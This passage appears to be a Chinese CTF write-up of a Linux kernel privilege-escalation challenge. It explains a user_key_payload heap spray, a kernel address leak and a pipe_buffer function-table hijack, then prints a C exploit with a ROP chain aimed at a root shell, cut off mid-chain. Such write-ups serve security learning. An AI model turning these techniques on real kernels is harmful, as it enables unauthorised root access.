<li>我们继续堆喷user_key_payload,与上面的堆喷有所不同的是，<strong>此次的临时存放payload的obj将不再使用UAF obj进行分配，因为此时的UAF obj不在cpu-&gt;freelist下，而是在node当中</strong>，因此同样当我们堆喷到slab当中只存在一个唯一的刚刚释放的临时payload堆块时，<strong>我们将从node中搜寻partial slab来进行分配，而我们刚刚置入node的那个partial slab就是存放着咱们空闲UAF obj的那个slab，因此此时将会把刚刚那个partial slab作为咱们新的cpu-&gt;freelist来进行分配，所以就达成了将我们的UAF obj分配为user_key_payload的过程</strong></li>
<li>此时我们为了之后可以成功泄露出基地址，这里我们需要将UAF obj所在的user_key_payload的head中datalen修改为更大的值，从而使得在keyctl_read的时候可以读到其他user_key_payload的值，而其他user_key_payload如果释放掉了payload，那么就可以从中泄露出基地址，所以此时我们首先释放UAF obj，然后开始利用漏洞模块的ioctl来进行堆喷，其中传入的buf对应user_key_payload的datalen字段的部分需要我们改大，此时当我们成功分配到之前释放的UAF obj的时候，就会将其对应的user_key_payload中的datalen进行修改</li>
<li>经过步骤五，我们已经将user_key_payload的datalen字段修改，但我们如何找到对应的key_id来进行泄露呢，这里有个keyctl_read，当我们读入buf之后，他的返回值不难分析得知就是user_key_payload-&gt;datalen，所以我们可以通过循环遍历，若该值大于我们之前分配的192，那么就说明他就是我们刚刚利用UAF obj改过的user_key_payload,在遍历的过程中，我们把其他的payload都利用keyctl_revoke进行释放，这样一来我们就可以通过越界读victim user_key_payload来读取其他payload头当中的全局指针了</li>
</ol>
<h4 id="控制流劫持"><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h4><p>我们在这里利用pipe进行劫持</p>
<p>当我们创建一个pipe管道过后，由上面的源码可以得知，在分配pipe的过程当中，他会从kmalloc-192当中分配一个pipe_inode_info结构体，并且在pipe_inode_info-&gt;bufs字段分配一个pipe_buffer数组(这里就可以说明他包含泄露内核堆地址的功能)，从kmalloc-1k当中分配，并且当我们释放掉管道的两端的时候，就会调用pipe_buffer中*ops表的release()函数，这里我们就可以伪造他的一个函数表进行控制，下面是详细步骤</p>
<ol>
<li>利用两个可以共存在漏洞模块数组的堆块，我们可以轻松的将obj1分配为一个user_key_payload,这里是为了pipe_inode_info所生成</li>
<li>然后我们分配obj0为一个1024的大块，将从kmalloc-1k中获取，然后释放掉他，这保证了我们之后分配pipe_buffer将会利用该obj进行分配，同时也释放掉obj1，这里的理由一致</li>
<li>调用pipe系统调用，这将使得我们obj0，obj1分别被分配为pipe_buffer和pipe_inode_info</li>
<li>此时我们的pipe_inode_info和user_key_payload都同时使用一个obj1进行分配，此时我们调用keyctl_read，传入size为0xffff来读我们二点pipe_inode_info,这将使得我们obj1中对应datalen字段变大，但经过测试是0x2000左右，此时我们就可以通过他来知道我们pipe_buffer的地址，然后我们此时可以通过释放obj0，分配obj0来达成修改pipe_buffer并且在上面伪造函数表的功能</li>
<li>最后释放两个文件描述符，来达成我们的提权</li>
</ol>
<p>这里的gadgets寻找十分困难，在内核中寻找gadget不同于以往，uesrland中的gadgets可能普遍较短就可以使用，但是内核的话在一般使用ROPgadget，ropper等无法寻找到相应堆块，因为按照国资师傅所说，gadget的列出是按照rip的改变作为结束点的，大概就是主动修改rip作为结束，所以在一些内核中较长的gadgets，涉及到多次rip变换就无法显现，奇怪的是利用objdump同样无法显出，因此经过mole师傅的指点，可以利用ROPgadget的另一个功能</p>
<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">ROPgadget --binary<span class="hljs-attribute">&lt;文件名&gt;</span> --opcode <span class="hljs-attribute">&lt;16进制汇编码&gt;</span><br></code></pre></td></tr></table></figure>

<p>还有个注意点那就是pipe_inode_info中，bufs字段的偏移为0x98，经过调试可以得出</p>
<p>本题实际上在控制流劫持当中就可以看出有更简便的方法，但是本节的主要部分是学习堆喷的步骤，因此就按着arttnba3师傅的节奏来</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/728da9773912b31bb3e93819c018367adab4e17d.jpg" srcset="/img/loading.gif" lazyload></p>
<p>以下是exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NODE_INFO_SZ 192</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_BUFFER_SZ 1024</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPRAY_NUM 40</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USER_FREE_PAYLOAD_RCU 0xffffffff813d8210</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250ca4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> XCHG_RDI_RAX_DEC_RET 0xffffffff81adfc70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMDOE 0xffffffff81e00ed0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPEC_PROCESS_KEYRING  -2  <span class="hljs-comment">/* - key ID for process-specific keyring */</span></span><br><br><span class="hljs-comment">/* keyctl commands */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UPDATE     2 <span class="hljs-comment">/* update a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_REVOKE     3 <span class="hljs-comment">/* revoke a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UNLINK     9 <span class="hljs-comment">/* unlink a key from a keyring */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_READ     11  <span class="hljs-comment">/* read a key or keyring&#x27;s contents */</span></span><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffffc0000000</span>;<br><br><br><span class="hljs-type">int</span> rwctf_fd;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff81095c30</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred = <span class="hljs-number">0xffffffff81096110</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span>&#123;</span><br>  <span class="hljs-type">uint32_t</span> idx;<br>  <span class="hljs-type">uint32_t</span> size;<br>  <span class="hljs-type">void</span>* buf;<br>&#125;;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:%p\n&quot;</span>, str, x)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>*)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_alloc</span><span class="hljs-params">(<span class="hljs-type">char</span>*, <span class="hljs-type">void</span>*, <span class="hljs-type">size_t</span>)</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>      <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>      <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>      <span class="hljs-string">&quot;pushf;&quot;</span><br>      <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>      );<br>  info_log(<span class="hljs-string">&quot;States has been saved successfully!&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>  <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>  CPU_ZERO(&amp;cpu_set);<br>  CPU_SET(core, &amp;cpu_set);<br>  sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>  info_log(<span class="hljs-string">&quot;bind core succesfully&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello\n&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">my_alloc</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx, <span class="hljs-type">uint32_t</span> size, <span class="hljs-type">void</span>* buf)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">n</span> =</span> &#123;<br>    .idx = idx,<br>    .size = size,<br>    .buf = buf,<br>  &#125;;<br>  ioctl(rwctf_fd, <span class="hljs-number">0xDEADBEEF</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">my_delete</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> idx)</span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userarg</span> <span class="hljs-title">n</span> =</span> &#123;<br>    .idx = idx,<br>  &#125;;<br>  ioctl(rwctf_fd, <span class="hljs-number">0xC0DECAFE</span>, &amp;n);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">key_alloc</span><span class="hljs-params">(<span class="hljs-type">char</span>* description, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_add_key, <span class="hljs-string">&quot;user&quot;</span>, description, payload, plen, KEY_SPEC_PROCESS_KEYRING);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">key_update</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_revoke</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, id, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_read</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* buffer, <span class="hljs-type">size_t</span> buflen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, id, buffer, buflen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_unlink</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, id, KEY_SPEC_PROCESS_KEYRING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span>&#123;<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  bind_cpu(<span class="hljs-number">0</span>);<br>  saveStatus();<br>  <span class="hljs-type">size_t</span>* buf;<br>  <span class="hljs-type">char</span> description[<span class="hljs-number">0x50</span>];<br>  <span class="hljs-type">int</span> key_id[KEY_SPRAY_NUM];<br>  <span class="hljs-type">int</span> victim_key_idx = <span class="hljs-number">-1</span>, kernel_offset = <span class="hljs-number">-1</span>, pipe_key_id;<br>  <span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], pipe_key_ret;<br>  <span class="hljs-type">size_t</span> pipe_buffer_addr;<br><br>  buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">0x4000</span>);<br><br>  rwctf_fd = open(<span class="hljs-string">&quot;/dev/rwctf&quot;</span>, O_RDONLY);<br>  <span class="hljs-keyword">if</span>(rwctf_fd &lt; <span class="hljs-number">0</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;/dev/rwctf had open failed!&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">   * construct the UAF obj,we just alloc and then free it to the cpu-&gt;freelist</span><br><span class="hljs-comment">   * */</span><br>  info_log(<span class="hljs-string">&quot;Construct the UAF obj&quot;</span>);<br>  my_alloc(<span class="hljs-number">0</span>, PIPE_NODE_INFO_SZ, buf);<br>  my_delete(<span class="hljs-number">0</span>);<br><br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">   * the UAF obj always be used by allocating the pre_payload,then alloc new obj for user_key_payload</span><br><span class="hljs-comment">   * so we could use the current cpu-&gt;freelist by heap sparying the user_key_payload</span><br><span class="hljs-comment">   * then the current slab will put to the kmem_cache_node,then get a new slab for allocating</span><br><span class="hljs-comment">   * finally, the UAF obj will be put into the kmem_cache_node</span><br><span class="hljs-comment">   * ======================================================================================</span><br><span class="hljs-comment">   * 1. use user_key_payload to full the cpu_freelist</span><br><span class="hljs-comment">   * 2. then we will put the current slab to the node</span><br><span class="hljs-comment">   * 3. during this time key_alloc, we finally will free the pre_payload, so we free the uaf obj in node</span><br><span class="hljs-comment">   * 4. next time we alloc pre_payload will from other slab----current cpu-&gt;freelist</span><br><span class="hljs-comment">   * 5. after that, we must to continue for sparying in order to full the current slab</span><br><span class="hljs-comment">   * 6. when the current slab full, the node slab will be put on the cpu_freelist,and use UAF obj to alloc user_key_payload</span><br><span class="hljs-comment">   * */</span><br>  info_log(<span class="hljs-string">&quot;Starting sparying the user_key_payload&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KEY_SPRAY_NUM; i++)&#123;<br>    <span class="hljs-built_in">snprintf</span>(description, <span class="hljs-number">0x50</span>, <span class="hljs-string">&quot;%s%d&quot;</span>, <span class="hljs-string">&quot;peiwithhao&quot;</span>, i);<br>    key_id[i] = key_alloc(description, buf, PIPE_NODE_INFO_SZ - <span class="hljs-number">0x18</span>);  <span class="hljs-comment">//0x18 is the user_key_payload head</span><br>    <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>      error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">//the UAF obj now be allocated as user_key_payload</span><br>  my_delete(<span class="hljs-number">0</span>);<br>  <span class="hljs-comment">//free the uaf obj, and allocate it again by second sparying,so we could modify the user_key_payload</span><br>  <span class="hljs-comment">//modify the buf,so we can overwrite the user_key_payload</span><br>  info_log(<span class="hljs-string">&quot;Starting sparying the uaf obj&quot;</span>);<br>  buf[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  buf[<span class="hljs-number">2</span>] = <span class="hljs-number">0x2000</span>;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; (KEY_SPRAY_NUM*<span class="hljs-number">2</span>); i++)&#123;<br>    my_alloc(<span class="hljs-number">0</span>, PIPE_NODE_INFO_SZ, buf);<br>  &#125;<br>  info_log(<span class="hljs-string">&quot;Sparying nearly four slab, it should be written!&quot;</span>);<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; KEY_SPRAY_NUM; i++)&#123;<br>    <span class="hljs-keyword">if</span>(key_read(key_id[i], buf, <span class="hljs-number">0x4000</span>) &gt; PIPE_NODE_INFO_SZ)&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Found the victim key_idx : %d\n&quot;</span>, i);<br>      victim_key_idx = i;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      key_revoke(key_id[i]);        <span class="hljs-comment">//then the user_key_payload&#x27;s head-&gt;call_back_head will be put by user_free_payload_rcu()</span><br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(victim_key_idx == <span class="hljs-number">-1</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;Found the victim key_id failed:(&quot;</span>);<br>  &#125;<br>  info_log(<span class="hljs-string">&quot;victim key_id founded!&quot;</span>);<br><br>  <span class="hljs-comment">/* find the rcu_head-&gt;callback_head */</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x2000</span>/<span class="hljs-number">8</span> ; i++)&#123;<br>    <span class="hljs-keyword">if</span>((buf[i]&amp;<span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x210</span>)&#123;<br>      kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;<br>      kernel_base += kernel_offset;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span>(kernel_offset == <span class="hljs-number">-1</span>)&#123;<br>    error_log(<span class="hljs-string">&quot;can not find the kernel offset&quot;</span>);<br>  &#125;<br>  PRINT_ADDR(<span class="hljs-string">&quot;Kernel_base&quot;</span>, kernel_base);<br>  PRINT_ADDR(<span class="hljs-string">&quot;Kernel_offset&quot;</span>, kernel_offset);<br>  <br>  <span class="hljs-comment">/* </span><br><span class="hljs-comment">   * Let the user_key_payload and pipe_inode_info belong to the same obj</span><br><span class="hljs-comment">   *</span><br><span class="hljs-comment">   * */</span><br>  <span class="hljs-comment">/* Construct the freelist 0-&gt;1 */</span><br>  my_alloc(<span class="hljs-number">0</span>, PIPE_NODE_INFO_SZ, buf);<br>  my_alloc(<span class="hljs-number">1</span>, PIPE_NODE_INFO_SZ, buf);<br>  my_delete(<span class="hljs-number">1</span>);<br>  my_delete(<span class="hljs-number">0</span>);<br>  <span class="hljs-comment">/* 1 object will be the user_key_payload */</span><br>  pipe_key_id = key_alloc(<span class="hljs-string">&quot;peiwithhao&quot;</span>, buf, PIPE_NODE_INFO_SZ - <span class="hljs-number">0x18</span>);<br>  my_delete(<span class="hljs-number">1</span>);<br>  <span class="hljs-comment">/* prepare for the pipe buffer */</span><br>  my_alloc(<span class="hljs-number">0</span>, PIPE_BUFFER_SZ, buf);<br>  my_delete(<span class="hljs-number">0</span>);<br>  pipe(pipe_fd);<br>  <br>  info_log(<span class="hljs-string">&quot;Starting control the process&quot;</span>);<br>  pipe_key_ret = key_read(pipe_key_id, buf, <span class="hljs-number">0xffff</span>);<br>  <br>  pipe_buffer_addr = buf[<span class="hljs-number">16</span>];   <span class="hljs-comment">//leak the bufs</span><br>  PRINT_ADDR(<span class="hljs-string">&quot;pipe_buffer addr&quot;</span>, pipe_buffer_addr);<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-keyword">sizeof</span>(buf));<br><br>  <span class="hljs-comment">/* ROP chain construct */</span><br>  buf[<span class="hljs-number">0</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwhhao&quot;</span>;<br>  buf[<span class="hljs-number">1</span>] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;peiwithhao&quot;</span>;<br>  buf[<span class="hljs-number">2</span>] = pipe_buffer_addr + <span class="hljs-number">0x18</span>;<br>  buf[<span class="hljs-number">3</span>] = POP_RBX_POP_RBP_POP_R12_RET + kernel_offset;                 <br>  buf[<span class="hljs-number">4</span>] = PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET + kernel_offset;    <span class="hljs-comment">//release()</span><br>  buf[<span class="hljs-number">5</span>] = *(<span class="hljs-type">size_t</span>*)<span 